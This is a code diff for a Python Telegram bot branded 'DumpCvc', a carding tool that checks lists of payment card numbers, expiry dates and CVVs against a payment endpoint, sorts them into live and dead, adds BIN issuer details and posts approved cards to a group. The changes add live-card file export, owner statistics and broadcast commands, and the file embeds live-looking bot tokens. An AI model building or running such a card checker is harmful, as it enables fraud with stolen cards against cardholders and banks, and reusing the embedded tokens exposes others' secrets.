@@ -9,7 +9,7 @@ from datetime import datetime
 from typing import Optional, Dict, List, Union
 
 # Configuration
-BOT_TOKEN = "8468435407:AAGngWi5PsqVRw6jSc91JqUnYpm_gBQiY9Y"
+BOT_TOKEN = "8468435407:AAG5hTBdGRKioJO9yyJoi2T8JgEIfjgIra8"
 OWNER_ID = 6319579484
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 TARGET_GROUP_ID = "-4828878766"
@@ -226,8 +226,9 @@ class CardChecker:
                 
                 response_match = re.search(r'"Response":"([^"]*)"', text)
                 if response_match:
-                    response = response_match.group(1).replace('<br>', '')
+                    response = response_match.group(1).replace('<br>', '').strip()
                     
+                    # Check against response map
                     for msg, status, res in CardChecker.RESPONSE_MAP:
                         if msg.lower() in response.lower():
                             bin_number = cardno[:6]
@@ -235,41 +236,49 @@ class CardChecker:
                             
                             return {
                                 'lista': lista,
-                                'msg': msg,
+                                'msg': res,
                                 'status': status,
-                                'res': res,
+                                'raw_response': response,
                                 'success': True,
-                                'bin_info': bin_info
+                                'bin_info': bin_info,
+                                'error': False
                             }
                     
+                    # No match found - dead card
                     bin_number = cardno[:6]
                     bin_info = await CardChecker.get_bin_info(session, bin_number)
                     
                     return {
                         'lista': lista,
                         'msg': response,
-                        'status': 'Unknown',
-                        'res': response,
+                        'status': 'Dead',
+                        'raw_response': response,
                         'success': True,
-                        'bin_info': bin_info
+                        'bin_info': bin_info,
+                        'error': False
                     }
                 else:
+                    # No response pattern found
                     return {
                         'lista': lista,
-                        'msg': 'No response',
+                        'msg': 'No response pattern found',
                         'status': 'Error',
-                        'res': text[:100],
+                        'raw_response': text[:200],
                         'success': False,
-                        'bin_info': None
+                        'bin_info': None,
+                        'error': True,
+                        'error_html': text
                     }
         except Exception as e:
             return {
                 'lista': f"{card['cardno']}|{card['mm']}|{card['yyyy']}|{card['cvv']}",
-                'msg': f'Error: {str(e)}',
+                'msg': f'Request Error: {str(e)}',
                 'status': 'Error',
-                'res': str(e),
+                'raw_response': str(e),
                 'success': False,
-                'bin_info': None
+                'bin_info': None,
+                'error': True,
+                'error_html': f"<pre>Error: {str(e)}</pre>"
             }
 
 
@@ -344,6 +353,34 @@ class TelegramBot:
                     return None
         except Exception as e:
             print(f"Exception in send_msg: {e}")
+            return None
+    
+    async def send_document(
+        self,
+        chat_id: Union[int, str],
+        document_content: str,
+        filename: str,
+        caption: str = ""
+    ) -> Optional[Dict]:
+        """Send document to chat"""
+        await self.init_session()
+        
+        data = aiohttp.FormData()
+        data.add_field('chat_id', str(chat_id))
+        data.add_field('document', document_content.encode('utf-8'), filename=filename, content_type='text/plain')
+        if caption:
+            data.add_field('caption', caption)
+        
+        try:
+            async with self.session.post(f"{API_URL}/sendDocument", data=data) as resp:
+                result = await resp.json()
+                if result.get("ok"):
+                    return result.get("result")
+                else:
+                    print(f"Error sending document: {result.get('description')}")
+                    return None
+        except Exception as e:
+            print(f"Exception in send_document: {e}")
             return None
     
     async def edit_msg(
@@ -802,7 +839,6 @@ class TelegramBot:
             else:
                 new_expiry = current_time + (key_data["days"] * 24 * 60 * 60)
             
-            # Convert to DD-MM-YYYY format
             new_expiry_date = datetime.fromtimestamp(new_expiry).strftime("%d-%m-%Y")
             
             users[user_key]["Expiry"] = new_expiry_date
@@ -845,7 +881,7 @@ class TelegramBot:
             await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
             return
         
-        if user_id in self.active_sessions:
+        if user_id in self.active_sessions and self.active_sessions[user_id].get('active'):
             await self.send_msg(chat_id, "❌ You already have an active checking session! Stop it first.", reply_to_message_id=reply_to)
             return
         
@@ -907,30 +943,54 @@ class TelegramBot:
         self.active_sessions[user_id] = {
             "active": True,
             "message_id": status_msg["message_id"],
-            "chat_id": chat_id
+            "chat_id": chat_id,
+            "live_cards": [],
+            "dead_cards": []
         }
         
         checked_count = 0
+        live_count = 0
+        dead_count = 0
         
-        for idx, card in enumerate(valid_cards):
-            if user_id not in self.active_sessions or not self.active_sessions[user_id]["active"]:
+        for idx, card in enumerate(valid_cards, 1):
+            if user_id not in self.active_sessions or not self.active_sessions[user_id].get('active'):
                 final_text = f"""<b>Welcome To DumpCvc</b>
 <b>Power Checked Cc Droper</b>
 
 <b>• Session Stopped by User •</b>
 
 📊 Checked: {checked_count}/{len(valid_cards)} cards"""
-                await self.edit_msg(chat_id, status_msg["message_id"], final_text)
-                if user_id in self.active_sessions:
-                    del self.active_sessions[user_id]
+                
+                live_dead_keyboard = {
+                    "inline_keyboard": [
+                        [{"text": f"🟢 Live: {live_count}", "callback_data": f"get_live:{user_id}"}],
+                        [{"text": f"🔴 Dead: {dead_count}", "callback_data": f"get_dead:{user_id}"}]
+                    ]
+                }
+                
+                await self.edit_msg(chat_id, status_msg["message_id"], final_text, reply_markup=live_dead_keyboard)
                 return
             
             result = await CardChecker.check_card(self.session, card)
             checked_count += 1
             
+            card_lista = result['lista']
+            
+            # Determine if card is live or dead
+            if result['status'] in ['Approved', 'ccn']:
+                live_count += 1
+                self.active_sessions[user_id]['live_cards'].append(card_lista)
+                emoji = "🟢"
+                status_display = result['status']
+            else:
+                dead_count += 1
+                self.active_sessions[user_id]['dead_cards'].append(card_lista)
+                emoji = "🔴"
+                status_display = "Dead"
+            
             current_card = f"💳 Current: {card['cardno'][:4]}...{card['cardno'][-4:]}"
             response_text = f"📝 Response: {result['msg'][:30]}..."
-            status_text = f"✅ Status: {result['status']}"
+            status_text = f"{emoji} Status: {status_display}"
             progress_text = f"📊 Progress: {checked_count}/{len(valid_cards)}"
             
             inline_keyboard = {
@@ -948,9 +1008,18 @@ class TelegramBot:
 
 <b>• Your Check-in is in progress •</b>"""
             
-            await self.edit_msg(chat_id, status_msg["message_id"], session_text, reply_markup=inline_keyboard)
+            try:
+                await self.edit_msg(chat_id, status_msg["message_id"], session_text, reply_markup=inline_keyboard)
+            except:
+                pass
             
-            result_text = f"<code>{result['lista']}</code>\n{result['msg']} - {result['status']}"
+            # Send to owner
+            if result['status'] in ['Approved', 'ccn']:
+                owner_emoji = "✅" if result['status'] == 'Approved' else "⚠️"
+            else:
+                owner_emoji = "❌"
+            
+            result_text = f"{owner_emoji} <code>{result['lista']}</code>\n<b>Response:</b> {result['msg']}\n<b>Status:</b> {result['status']}"
             
             if result.get('bin_info'):
                 bin_info = result['bin_info']
@@ -965,10 +1034,37 @@ class TelegramBot:
 ⭐ <b>Brand:</b> {bin_info['brand']}
 """
             
-            try:
-                await self.send_msg(TARGET_GROUP_ID, result_text)
-            except Exception as e:
-                print(f"Error sending to group: {e}")
+            await self.send_msg(chat_id, result_text)
+            
+            # Send only approved cards to group
+            if result['status'] in ['Approved', 'ccn']:
+                try:
+                    group_text = f"🟢 <b>APPROVED</b>\n\n<code>{result['lista']}</code>\n<b>Response:</b> {result['msg']}"
+                    
+                    if result.get('bin_info'):
+                        bin_info = result['bin_info']
+                        group_text += f"""
+
+━━━━━━━━━━━━━━━━
+<b>BIN Info:</b>
+{bin_info['flag']} <b>Country:</b> {bin_info['country']}
+💳 <b>Scheme:</b> {bin_info['scheme']}
+🏦 <b>Issuer:</b> {bin_info['issuer']}
+📇 <b>Type:</b> {bin_info['type']}
+⭐ <b>Brand:</b> {bin_info['brand']}
+"""
+                    
+                    await self.send_msg(TARGET_GROUP_ID, group_text)
+                except Exception as e:
+                    print(f"Error sending to group: {e}")
+            
+            # Send error HTML to owner if there's an error
+            if result.get('error'):
+                try:
+                    error_html = result.get('error_html', 'Unknown error')
+                    await self.send_msg(chat_id, f"⚠️ <b>Request Error for card:</b>\n<code>{card_lista}</code>\n\n{error_html}")
+                except:
+                    pass
             
             await asyncio.sleep(1)
         
@@ -980,10 +1076,17 @@ class TelegramBot:
 📊 Total Checked: {checked_count}/{len(valid_cards)} cards
 ✅ All cards processed!"""
         
-        await self.edit_msg(chat_id, status_msg["message_id"], final_text)
+        live_dead_keyboard = {
+            "inline_keyboard": [
+                [{"text": f"🟢 Live: {live_count}", "callback_data": f"get_live:{user_id}"}],
+                [{"text": f"🔴 Dead: {dead_count}", "callback_data": f"get_dead:{user_id}"}]
+            ]
+        }
         
-        if user_id in self.active_sessions:
-            del self.active_sessions[user_id]
+        await self.edit_msg(chat_id, status_msg["message_id"], final_text, reply_markup=live_dead_keyboard)
+        
+        # Keep session data for file generation
+        self.active_sessions[user_id]['active'] = False
     
     async def handle_adgr(self, message: Dict):
         """Handle /adgr command"""
@@ -1112,6 +1215,85 @@ Users can claim this key using:
         
         await self.send_msg(chat_id, key_info, reply_to_message_id=reply_to)
     
+    async def handle_stats(self, message: Dict):
+        """Handle /stats command"""
+        user_id = message["from"]["id"]
+        chat_id = message["chat"]["id"]
+        reply_to = message.get("message_id")
+        
+        if user_id != OWNER_ID:
+            await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
+            return
+        
+        users = Database.load("users")
+        keys = Database.load("keys")
+        groups = Database.load("group")
+        
+        total_users = len(users)
+        active_users = sum(1 for u in users.values() if u.get("Expiry", "0") != "0")
+        total_keys = len(keys)
+        claimed_keys = sum(1 for k in keys.values() if k.get("status") == "Claimed")
+        total_groups = len(groups) if isinstance(groups, list) else 0
+        
+        stats_text = f"""
+📊 <b>Bot Statistics</b>
+
+👥 <b>Users:</b>
+• Total: {total_users}
+• Active: {active_users}
+• Inactive: {total_users - active_users}
+
+🔑 <b>Keys:</b>
+• Total: {total_keys}
+• Claimed: {claimed_keys}
+• Available: {total_keys - claimed_keys}
+
+📢 <b>Groups:</b>
+• Total: {total_groups}
+
+🤖 <b>System:</b>
+• Active Sessions: {len([s for s in self.active_sessions.values() if s.get('active')])}
+"""
+        
+        await self.send_msg(chat_id, stats_text, reply_to_message_id=reply_to)
+    
+    async def handle_broadcast(self, message: Dict):
+        """Handle /broadcast command"""
+        user_id = message["from"]["id"]
+        chat_id = message["chat"]["id"]
+        reply_to = message.get("message_id")
+        
+        if user_id != OWNER_ID:
+            await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
+            return
+        
+        text = message["text"].strip()
+        parts = text.split(maxsplit=1)
+        
+        if len(parts) < 2:
+            await self.send_msg(chat_id, "❌ Usage: /broadcast [message]\n\nExample: /broadcast Hello everyone!", reply_to_message_id=reply_to)
+            return
+        
+        broadcast_msg = parts[1]
+        users = Database.load("users")
+        
+        success = 0
+        failed = 0
+        
+        status_msg = await self.send_msg(chat_id, f"📤 Broadcasting to {len(users)} users...", reply_to_message_id=reply_to)
+        
+        for user_key in users.keys():
+            try:
+                await self.send_msg(int(user_key), broadcast_msg)
+                success += 1
+                await asyncio.sleep(0.05)
+            except:
+                failed += 1
+        
+        final_text = f"✅ Broadcast completed!\n\n✅ Success: {success}\n❌ Failed: {failed}"
+        if status_msg:
+            await self.edit_msg(chat_id, status_msg["message_id"], final_text)
+    
     async def handle_callback_query(self, callback_query: Dict):
         """Handle callback queries"""
         data = callback_query.get("data")
@@ -1152,15 +1334,14 @@ Users can claim this key using:
 
 <b>Hello {first_name}!</b>
 
-I'm an advanced Telegram bot with card checking features.
+✨ <u>Available Features</u>  
+- Card Validation & Checking  
+- Live Dump CC Dropper  
 
-<b>🔹 Features:</b>
-- Card Validation & Checking
-- User Management
-- Subscription System
-- Group Management
+📌 Use <b>/cmds</b> to view all available commands.  
 
-Use /cmds to see all available commands.
+——————————————  
+<b>⚡ Powered by DumpCvc 🗑️</b>
 """
             
             inline_keyboard = {
@@ -1178,7 +1359,7 @@ Use /cmds to see all available commands.
             about_text = """
 <b>ℹ️ About This Bot</b>
 
-<b>Version:</b> 1.0.0
+<b>Version:</b> 2.0.0
 <b>Developer:</b> U8I3O 
 <b>Features:</b> Card Checking, User Management
 
@@ -1192,12 +1373,29 @@ Built with Python & asyncio for high performance.
             await self.edit_msg(chat_id, message_id, about_text, reply_markup=inline_keyboard)
         
         elif action == "stop_session":
-            await self.answer_callback_query(callback_id)
+            await self.answer_callback_query(callback_id, "🛑 Stopping session...")
             if original_user_id in self.active_sessions:
                 self.active_sessions[original_user_id]["active"] = False
-                await self.answer_callback_query(callback_id, "🛑 Session stopped!", show_alert=True)
-            else:
-                await self.answer_callback_query(callback_id, "❌ No active session found!", show_alert=True)
+        
+        elif action == "get_live":
+            await self.answer_callback_query(callback_id)
+            if original_user_id in self.active_sessions:
+                live_cards = self.active_sessions[original_user_id].get('live_cards', [])
+                if live_cards:
+                    live_text = "\n".join(live_cards)
+                    await self.send_document(chat_id, live_text, "live_cards.txt", "🟢 Live Cards")
+                else:
+                    await self.answer_callback_query(callback_id, "No live cards found!", show_alert=True)
+        
+        elif action == "get_dead":
+            await self.answer_callback_query(callback_id)
+            if original_user_id in self.active_sessions:
+                dead_cards = self.active_sessions[original_user_id].get('dead_cards', [])
+                if dead_cards:
+                    dead_text = "\n".join(dead_cards)
+                    await self.send_document(chat_id, dead_text, "dead_cards.txt", "🔴 Dead Cards")
+                else:
+                    await self.answer_callback_query(callback_id, "No dead cards found!", show_alert=True)
         
         elif action == "noop":
             await self.answer_callback_query(callback_id)
@@ -1210,6 +1408,8 @@ Built with Python & asyncio for high performance.
         self.register_user(user_id, first_name, username)
         
         if "text" not in message:
+            if "document" in message and user_id == OWNER_ID:
+                await self.handle_chk(message)
             return
         
         text = message["text"]
@@ -1218,7 +1418,7 @@ Built with Python & asyncio for high performance.
             await self.handle_start(message)
         elif text == "/cmds":
             await self.handle_cmds(message)
-        elif text == "/chk":
+        elif text == "/chk" or text.startswith("/chk"):
             await self.handle_chk(message)
         elif text.startswith("/b3"):
             await self.handle_b3(message)
@@ -1232,6 +1432,10 @@ Built with Python & asyncio for high performance.
             await self.handle_key(message)
         elif text.startswith("/claim"):
             await self.handle_claim(message)
+        elif text.startswith("/stats"):
+            await self.handle_stats(message)
+        elif text.startswith("/broadcast"):
+            await self.handle_broadcast(message)
     
     async def process_update(self, update: Dict):
         """Process a single update"""
